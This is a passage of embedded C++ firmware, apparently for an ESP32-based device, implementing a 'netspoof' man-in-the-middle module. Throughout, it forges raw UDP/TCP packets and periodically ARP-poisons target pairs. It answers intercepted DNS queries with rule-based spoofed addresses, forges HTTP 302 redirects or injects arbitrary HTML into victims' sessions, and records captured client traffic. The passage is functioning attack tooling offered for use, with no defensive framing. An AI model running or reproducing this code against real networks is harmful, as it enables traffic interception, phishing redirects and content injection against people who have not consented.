    _put16(udp + 6, 0);
    memcpy(udp + 8, payload, payloadLen);

    uint32_t acc = _sum16((const uint8_t *)&srcIp, 4, 0);
    acc = _sum16((const uint8_t *)&dstIp, 4, acc);
    acc += 17;
    acc += (uint16_t)l4Len;
    acc = _sum16(udp, l4Len, acc);
    uint16_t sum = _finish16(acc);
    _put16(udp + 6, sum == 0 ? 0xFFFF : sum);

    return _txEth(dstMac, s_myMac, 0x0800, ip, 20 + l4Len);
}

/// Send a TCP segment carrying @p payload as data from @p srcIp to the station.
static bool _txTcpRaw(
    const uint8_t dstMac[6], uint32_t srcIp, uint32_t dstIp, uint16_t srcPort, uint16_t dstPort,
    uint32_t seq, uint32_t ack, uint8_t flags, const uint8_t *payload, size_t payloadLen
) {
    size_t l4Len = 20 + payloadLen;
    if (20 + l4Len > sizeof(s_l4)) return false;

    uint8_t *ip = s_l4;
    ip[0] = 0x45;
    ip[1] = 0x00;
    _put16(ip + 2, (uint16_t)(20 + l4Len));
    _put16(ip + 4, ++s_ipId);
    _put16(ip + 6, 0x4000); // don't fragment
    ip[8] = 64;
    ip[9] = 6;
    _put16(ip + 10, 0);
    // srcIp/dstIp hold wire-order bytes (they were memcpy'd off the received header),
    // which is also what the checksum pseudo-header sums. They must go back on the
    // wire with memcpy: _put32() writes big-endian from a *host-order* value, so on
    // this little-endian part it would byte-reverse the addresses and every client
    // would silently drop the forged packet at the IP layer.
    memcpy(ip + 12, &srcIp, 4);
    memcpy(ip + 16, &dstIp, 4);
    _put16(ip + 10, _finish16(_sum16(ip, 20, 0)));

    uint8_t *tcp = ip + 20;
    _put16(tcp, srcPort);
    _put16(tcp + 2, dstPort);
    _put32(tcp + 4, seq); // host-order values, big-endian on the wire
    _put32(tcp + 8, ack);
    tcp[12] = 0x50;
    tcp[13] = flags;
    _put16(tcp + 14, 64240);
    _put16(tcp + 16, 0);
    _put16(tcp + 18, 0);
    memcpy(tcp + 20, payload, payloadLen);

    uint32_t acc = _sum16((const uint8_t *)&srcIp, 4, 0);
    acc = _sum16((const uint8_t *)&dstIp, 4, acc);
    acc += 6;
    acc += (uint16_t)l4Len;
    acc = _sum16(tcp, l4Len, acc);
    _put16(tcp + 16, _finish16(acc));

    return _txEth(dstMac, s_myMac, 0x0800, ip, 20 + l4Len);
}

static void _capturePush(const NetSpoofSlot *slot, const char *method, const char *host, const char *path, uint8_t action) {
    _lock();
    if (s_captureCount == NETSPOOF_MAX_CAPTURES) s_captureCount = NETSPOOF_MAX_CAPTURES - 1;
    for (int i = s_captureCount; i > 0; i--) s_captures[i] = s_captures[i - 1];
    NetSpoofCapture &c = s_captures[0];
    memset(&c, 0, sizeof(c));
    c.ts = millis();
    c.kind = slot->kind;
    c.action = action;
    IPAddress clientAddr(slot->srcIp);
    c.clientIp = clientAddr;
    String m = _macStr(slot->clientMac);
    strncpy(c.clientMac, m.c_str(), sizeof(c.clientMac) - 1);
    if (method) strncpy(c.method, method, sizeof(c.method) - 1);
    if (host) strncpy(c.host, host, sizeof(c.host) - 1);
    if (path) strncpy(c.path, path, sizeof(c.path) - 1);
    size_t n = slot->copyLen < NETSPOOF_CAPTURE_PAYLOAD - 1 ? slot->copyLen : NETSPOOF_CAPTURE_PAYLOAD - 1;
    for (size_t i = 0; i < n; i++) {
        char ch = (char)slot->data[i];
        c.data[i] = (ch >= 32 && ch < 127) ? ch : '.';
    }
    c.data[n] = '\0';
    s_captureCount++;
    _unlock();
}

// --- DNS rules ------------------------------------------------------------

static bool _dnsRuleMatch(const NetSpoofRule &r, const String &name) {
    if (r.wildcard) return true;
    if (r.match.length() == 0) return false;
    if (name.equalsIgnoreCase(r.match)) return true;
    String suffix = "." + r.match;
    if (name.length() > suffix.length() &&
        name.substring(name.length() - suffix.length()).equalsIgnoreCase(suffix)) {
        return true;
    }
    // "*.example.com" also matches example.com itself
    if (r.match.startsWith("*.")) {
        String bare = r.match.substring(2);
        if (name.equalsIgnoreCase(bare)) return true;
        String s2 = "." + bare;
        if (name.length() > s2.length() &&
            name.substring(name.length() - s2.length()).equalsIgnoreCase(s2)) {
            return true;
        }
    }
    return false;
}

bool netspoof_dns_lookup(const String &name, IPAddress &ip) {
    _ensure_mutex();
    _lock();
    bool hit = false;
    for (int i = 0; i < s_dnsRuleCount && !hit; i++) {
        if (_dnsRuleMatch(s_dnsRules[i], name)) {
            ip.fromString(s_dnsRules[i].value.c_str());
            s_dnsRules[i].hits++;
            hit = true;
        }
    }
    _unlock();
    return hit;
}

/// Handle one queued DNS query: match a rule and answer it.
static void _handleDns(NetSpoofSlot *slot) {
    uint16_t txid = 0, qtype = 0, qclass = 0;
    char name[80];
    if (!_dnsQuestion(slot->data, slot->copyLen, &txid, name, sizeof(name), &qtype, &qclass)) return;

    s_dnsQueries++;
    String qname(name);

    IPAddress answer;
    if (!netspoof_dns_lookup(qname, answer)) {
        _capturePush(slot, "DNS", name, "", 0);
        return;
    }
    if (qtype != 1) { // only A records are answered; AAAA etc. are left alone
        _capturePush(slot, "DNS", name, "", 0);
        return;
    }

    size_t payloadLen = wifi_build_dns_response(
        s_l4b, sizeof(s_l4b), txid, name, answer.toString().c_str(), 300
    );
    if (payloadLen == 0) return;

    if (_txUdpRaw(slot->clientMac, slot->dstIp, slot->srcIp, 53, slot->srcPort, s_l4b, payloadLen)) {
        s_dnsAnswers++;
        _capturePush(slot, "DNS", name, answer.toString().c_str(), 1);
    } else {
        _capturePush(slot, "DNS", name, "", 0);
    }
}

// --- HTTP rules -----------------------------------------------------------

static bool _httpRuleMatch(const NetSpoofRule &r, const String &host, const String &url) {
    if (r.wildcard) return true;
    if (r.match.length() == 0) return false;
    if (host.equalsIgnoreCase(r.match)) return true;
    if (host.indexOf(r.match) >= 0) return true;
    if (url.indexOf(r.match) >= 0) return true;
    if (r.match.startsWith("*.")) {
        String bare = r.match.substring(2);
        if (host.equalsIgnoreCase(bare)) return true;
        String suffix = "." + bare;
        if (host.length() > suffix.length() &&
            host.substring(host.length() - suffix.length()).equalsIgnoreCase(suffix)) {
            return true;
        }
    }
    return false;
}

/// Parse the request line and Host header out of an HTTP request.
static void _parseHttp(
    const uint8_t *data, size_t len, String &method, String &path, String &host
) {
    String head;
    head.reserve(len + 1);
    for (size_t i = 0; i < len; i++) {
        char c = (char)data[i];
        if (c == '\0') break;
        head += c;
    }

    int sp1 = head.indexOf(' ');
    if (sp1 > 0) {
        method = head.substring(0, sp1);
    } else {
        method = "GET";
        sp1 = -1;
    }
    if (sp1 >= 0) {
        int sp2 = head.indexOf(' ', sp1 + 1);
        path = (sp2 > sp1) ? head.substring(sp1 + 1, sp2) : head.substring(sp1 + 1);
    } else {
        path = "/";
    }
    path.trim();

    // Host header, case-insensitive search over the header block.
    String lower = head;
    lower.toLowerCase();
    int h = lower.indexOf("\nhost:");
    if (h >= 0) {
        int start = h + 6;
        int end = lower.indexOf('\r', start);
        if (end < 0) end = lower.indexOf('\n', start);
        if (end < 0) end = head.length();
        host = head.substring(start, end);
        host.trim();
    }
    host.toLowerCase();
    method.toUpperCase();
    if (method.length() > 7) method = method.substring(0, 7);
    if (path.length() > 95) path = path.substring(0, 95);
    if (host.length() > 47) host = host.substring(0, 47);
}

/// Build "HTTP/1.1 302 Found ..." style responses into @p out.
static size_t _buildHttpResponse(
    char *out, size_t cap, int status, const char *reason, const char *contentType, const String &body,
    const String &location
) {
    String head;
    head.reserve(256);
    head += "HTTP/1.1 ";
    head += String(status);
    head += " ";
    head += reason;
    head += "\r\n";
    if (location.length()) {
        head += "Location: ";
        head += location;
        head += "\r\n";
    }
    if (contentType && *contentType) {
        head += "Content-Type: ";
        head += contentType;
        head += "\r\n";
    }
    head += "Connection: close\r\n";
    head += "Cache-Control: no-store\r\n";

    // Content-Length must match what actually goes on the wire, so work out how
    // much of the body fits before fixing the header up.
    size_t room = cap > head.length() + 32 ? cap - head.length() - 32 : 0;
    size_t bodyLen = body.length();
    if (bodyLen > room) bodyLen = room;

    head += "Content-Length: ";
    head += String((unsigned)bodyLen);
    head += "\r\n\r\n";

    size_t total = head.length() + bodyLen;
    if (total > cap) return 0;
    memcpy(out, head.c_str(), head.length());
    if (bodyLen) memcpy(out + head.length(), body.c_str(), bodyLen);
    return total;
}

/// Handle one queued HTTP request: match a rule and answer it.
static void _handleHttp(NetSpoofSlot *slot) {
    s_httpRequests++;

    String method, path, host;
    _parseHttp(slot->data, slot->copyLen, method, path, host);
    String url = "http://" + host + path;

    // Pick the rule that applies: redirects win over injections.
    String location, html;
    uint8_t action = 0;
    int redirectIdx = -1, injectIdx = -1;

    _ensure_mutex();
    _lock();
    for (int i = 0; i < s_redirCount && redirectIdx < 0; i++) {
        if (_httpRuleMatch(s_redirRules[i], host, url)) redirectIdx = i;
    }
    for (int i = 0; i < s_injectCount && injectIdx < 0; i++) {
        if (_httpRuleMatch(s_injectRules[i], host, url)) injectIdx = i;
    }
    if (redirectIdx >= 0) {
        location = s_redirRules[redirectIdx].value;
        s_redirRules[redirectIdx].hits++;
    } else if (injectIdx >= 0) {
        html = s_injectRules[injectIdx].value;
        s_injectRules[injectIdx].hits++;
    }
    _unlock();

    if (redirectIdx < 0 && injectIdx < 0) {
        _capturePush(slot, method.c_str(), host.c_str(), path.c_str(), 0);
        return;
    }

    // The response must fit one ethernet frame: 1514 - 14 eth - 20 ip - 20 tcp.
    const size_t kMaxPayload = 1450;
    size_t payloadLen;
    if (redirectIdx >= 0) {
        // A long Location is trimmed: an over-long redirect is worse than a
        // slightly different one, because an oversized frame never leaves.
        while (location.length() > 900) location = location.substring(0, location.length() - 1);
        payloadLen = _buildHttpResponse(
            (char *)s_l4b, kMaxPayload, 302, "Found", NULL, String(), location
        );
        action = 1;
    } else {
        payloadLen = _buildHttpResponse(
            (char *)s_l4b, kMaxPayload, 200, "OK", "text/html; charset=utf-8", html, String()
        );
        action = 2;
    }
    if (payloadLen == 0) {
        _capturePush(slot, method.c_str(), host.c_str(), path.c_str(), 0);
        return;
    }

    // The client's ACK is the sequence number it expects next from the server,
    // and our segment has to acknowledge everything the client sent.
    uint32_t ack = slot->seq + slot->payloadLen;
    if (slot->flags & 0x02) ack++; // SYN
    if (slot->flags & 0x01) ack++; // FIN

    bool sent = _txTcpRaw(
        slot->clientMac, slot->dstIp, slot->srcIp, slot->dstPort, slot->srcPort, slot->ack, ack, 0x18,
        s_l4b, payloadLen
    );
    if (sent) {
        if (action == 1) s_httpRedirected++;
        else s_httpInjected++;
    }
    _capturePush(slot, method.c_str(), host.c_str(), path.c_str(), sent ? action : 0);
}

// ===========================================================================
// 7. Service task
// ===========================================================================

static void _svcLoop(void *arg) {
    (void)arg;
    uint32_t lastPoison = 0;
    NetSpoofPair snapshot[NETSPOOF_MAX_PAIRS];

    while (s_svcRun) {
        NetSpoofSlot *slot = _slotTake();
        if (slot) {
            if (slot->kind == 0) {
                if (s_dnsActive) _handleDns(slot);
            } else {
                if (s_httpActive) _handleHttp(slot);
            }
            _slotRelease(slot);
        }

        uint32_t now = millis();
        if (now - lastPoison >= NETSPOOF_POISON_INTERVAL_MS) {
            lastPoison = now;
            int n = 0;
            _pairsSnapshot(snapshot, &n, NETSPOOF_MAX_PAIRS);
            for (int i = 0; i < n; i++) _poisonPair(snapshot[i], 1);
        }

        vTaskDelay(pdMS_TO_TICKS(NETSPOOF_SVC_TICK_MS));
    }

    s_svcTask = NULL;
    vTaskDelete(NULL);
}

static void _svcStart() {
    if (s_svcTask) return;
    s_svcRun = true;
    if (xTaskCreateUniversal(
            _svcLoop, "netspoofSvc", 4096, NULL, 1, &s_svcTask, ARDUINO_RUNNING_CORE
        ) != pdPASS) {
        s_svcTask = NULL;
        s_svcRun = false;
        Serial.println("[NETSPOOF] could not start the service task");
    }
}

static void _svcStopIfIdle() {
    if (s_svcTask && !netspoof_arp_active() && !s_dnsActive && !s_httpActive) {
        s_svcRun = false;
    }
}

// ===========================================================================
// 8. DNS / HTTP public API
// ===========================================================================

bool netspoof_dns_active() { return s_dnsActive; }
uint32_t netspoof_dns_queries() { return s_dnsQueries; }
uint32_t netspoof_dns_answers() { return s_dnsAnswers; }

bool netspoof_dns_add_rule(const String &domain, const String &ip, bool wildcard, String &err) {
    IPAddress parsed;
    if (!parsed.fromString(ip.c_str())) {
        err = "invalid IPv4 address: " + ip;
        return false;
    }
    if (wildcard && domain.length() == 0) {
        // ok: startAll('*', ip)
    } else if (domain.length() == 0) {
        err = "domain is required";
        return false;
    }

    _ensure_mutex();
    _lock();
    if (s_dnsRuleCount >= NETSPOOF_MAX_RULES) {
        _unlock();
        err = "too many DNS rules (max " + String(NETSPOOF_MAX_RULES) + "); clearRules() first";
        return false;
    }
    // Replace an existing rule for the same pattern.
    for (int i = 0; i < s_dnsRuleCount; i++) {
        if (s_dnsRules[i].match.equalsIgnoreCase(domain)) {
            s_dnsRules[i].value = ip;
            s_dnsRules[i].wildcard = wildcard;
            _unlock();
            return true;
        }
    }
    NetSpoofRule &r = s_dnsRules[s_dnsRuleCount++];
    r.match = domain;
    r.match.toLowerCase();
    r.value = ip;
    r.wildcard = wildcard;
    r.hits = 0;
    _unlock();
    return true;
}

void netspoof_dns_clear_rules() {
    _ensure_mutex();
    _lock();
    s_dnsRuleCount = 0;
    _unlock();
}

int netspoof_dns_rule_count() {
    _lock();
    int n = s_dnsRuleCount;
    _unlock();
    return n;
}

const NetSpoofRule *netspoof_dns_rule(int idx) {
    if (idx < 0 || idx >= s_dnsRuleCount) return NULL;
    return &s_dnsRules[idx];
}

bool netspoof_dns_start(String &err) {
    if (!netspoof_wifi_ready(err)) return false;
    _ensure_mutex();
    if (netspoof_dns_rule_count() == 0) {
        err = "no DNS rules; call dnsSpoof.start(domain, ip) or dnsSpoof.startAll('*', ip) first";
        return false;
    }
    _svcStart();
    _hookInstall();
    s_dnsActive = true;
    err = "";
    return true;
}

bool netspoof_dns_stop(String &err) {
    (void)err;
    s_dnsActive = false;
    if (!s_httpActive) _hookUninstall();
    _svcStopIfIdle();
    return true;
}

bool netspoof_http_active() { return s_httpActive; }
uint32_t netspoof_http_requests() { return s_httpRequests; }
uint32_t netspoof_http_redirected() { return s_httpRedirected; }
uint32_t netspoof_http_injected() { return s_httpInjected; }

static bool _httpAddRule(NetSpoofRule *list, int &count, const String &pattern, const String &value, bool wildcard, String &err) {
    if (!wildcard && pattern.length() == 0) {
        err = "pattern is required (use '*' or pass wildcard)";
        return false;
    }
    if (value.length() == 0) {
        err = "value is required";
        return false;
    }
    _ensure_mutex();
    _lock();
    if (count >= NETSPOOF_MAX_RULES) {
        _unlock();
        err = "too many rules (max " + String(NETSPOOF_MAX_RULES) + "); clearRules() first";
        return false;
    }
    for (int i = 0; i < count; i++) {
        if (list[i].match.equalsIgnoreCase(pattern)) {
            list[i].value = value;
            list[i].wildcard = wildcard;
            _unlock();
            return true;
        }
    }
    NetSpoofRule &r = list[count++];
    r.match = pattern;
    r.match.toLowerCase();
    r.value = value;
    r.wildcard = wildcard;
    r.hits = 0;
    _unlock();
    return true;
}

bool netspoof_http_add_redirect(const String &pattern, const String &url, bool wildcard, String &err) {
    return _httpAddRule(s_redirRules, s_redirCount, pattern, url, wildcard, err);
}

bool netspoof_http_add_injection(const String &pattern, const String &html, bool wildcard, String &err) {
    return _httpAddRule(s_injectRules, s_injectCount, pattern, html, wildcard, err);
}

void netspoof_http_clear_rules() {
    _ensure_mutex();
    _lock();
    s_redirCount = 0;
    s_injectCount = 0;
    _unlock();
}

int netspoof_http_redirect_count() {
    _lock();
    int n = s_redirCount;
    _unlock();
    return n;
}

int netspoof_http_inject_count() {
    _lock();
    int n = s_injectCount;
    _unlock();
    return n;
}

const NetSpoofRule *netspoof_http_redirect_rule(int idx) {
    if (idx < 0 || idx >= s_redirCount) return NULL;
    return &s_redirRules[idx];
}

const NetSpoofRule *netspoof_http_inject_rule(int idx) {
    if (idx < 0 || idx >= s_injectCount) return NULL;
    return &s_injectRules[idx];
}

bool netspoof_http_start(String &err) {
    if (!netspoof_wifi_ready(err)) return false;
    _svcStart();
    _hookInstall();
    s_httpActive = true;
    // No rules is allowed: the interceptor then only records what it sees.
    err = "";
    return true;
}

bool netspoof_http_stop(String &err) {
    (void)err;
    s_httpActive = false;
    if (!s_dnsActive) _hookUninstall();
    _svcStopIfIdle();
    return true;
}

// ===========================================================================
// 9. Captures
// ===========================================================================

int netspoof_capture_count() { return s_captureCount; }

const NetSpoofCapture *netspoof_capture(int idx) {
    if (idx < 0 || idx >= s_captureCount) return NULL;
    return &s_captures[idx];
}

void netspoof_capture_clear() { s_captureCount = 0; }

// ===========================================================================
// 10. Lifecycle
// ===========================================================================

void netspoof_cleanup() {
    s_dnsActive = false;
    s_httpActive = false;
    _hookUninstall();
    netspoof_arp_restore_all();
    s_svcRun = false;
    // Let the service task notice and exit on its own; it owns its own handle.
    for (int i = 0; i < 20 && s_svcTask; i++) vTaskDelay(pdMS_TO_TICKS(10));
    s_captureCount = 0;
    s_targetCount = 0;
}

#endif // !LITE_VERSION
